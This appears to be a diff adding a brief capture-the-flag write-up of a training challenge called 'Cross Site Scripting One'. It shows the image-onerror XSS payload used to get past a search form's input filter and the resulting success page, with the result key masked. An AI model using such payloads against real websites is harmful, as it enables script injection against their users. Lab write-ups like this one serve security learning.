@@ -1,0 +1,24 @@
+
+Cross Site Scripting One
+
+Find a XSS vulnerability in the following form. It would appear that your input is been filtered!
+Please enter the Search Term that you want to look up
+
+
+This is simliar to the last one it is just pop a client side XSS on the page for that I will use this command
+
+<IMG SRC="#" ONERROR="alert('XSS')"/>
+
+This resulted in a popup box that said XSS and gave the following
+
+
+Well Done
+
+You successfully executed the JavaScript alert command!
+The result key for this challenge is
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+ 
+Search Results
+
+Sorry but there were no results found that related to 'IMAGE'
